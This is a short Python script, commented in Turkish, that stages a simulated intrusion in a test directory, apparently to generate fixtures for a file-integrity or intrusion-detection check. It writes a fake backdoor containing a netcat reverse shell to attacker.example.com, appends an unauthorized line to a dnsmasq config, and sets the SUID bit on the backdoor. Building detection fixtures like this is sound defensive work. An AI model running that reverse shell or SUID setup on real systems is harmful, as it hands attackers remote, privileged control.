"""
data/suspicious üzerinde bilinçli, gerçekçi bir "saldırı" simülasyonu yapar:
1. Yeni bir backdoor dosyası ekler
2. Var olan bir konfigürasyon dosyasını değiştirir
3. Bir dosyanın izinlerini şüpheli şekilde değiştirir (SUID ekler)
"""
import os
import stat

suspicious_dir = "data/suspicious"

# 1. Backdoor dosyası ekle
backdoor_path = os.path.join(suspicious_dir, "usr/bin/update_service")
os.makedirs(os.path.dirname(backdoor_path), exist_ok=True)
with open(backdoor_path, "w") as f:
    f.write("#!/bin/sh\n# gizli backdoor: reverse_shell baglantisi\nnc -e /bin/sh attacker.example.com 4444\n")
print(f"Backdoor eklendi: {backdoor_path}")

# 2. Var olan bir dosyayı değiştir (örnek: hostname config)
target_file = os.path.join(suspicious_dir, "etc/dnsmasq.conf")
if os.path.exists(target_file):
    with open(target_file, "a") as f:
        f.write("\n# unauthorized modification\n")
    print(f"Değiştirildi: {target_file}")
else:
    print(f"Uyarı: {target_file} bulunamadı, atlandı")

# 3. Şüpheli izin değişikliği (SUID biti ekle)
if os.path.exists(backdoor_path):
    current_mode = os.stat(backdoor_path).st_mode
    os.chmod(backdoor_path, current_mode | stat.S_ISUID | stat.S_IXUSR)
    print(f"SUID izni eklendi: {backdoor_path}")

print("\nSimülasyon tamamlandı.")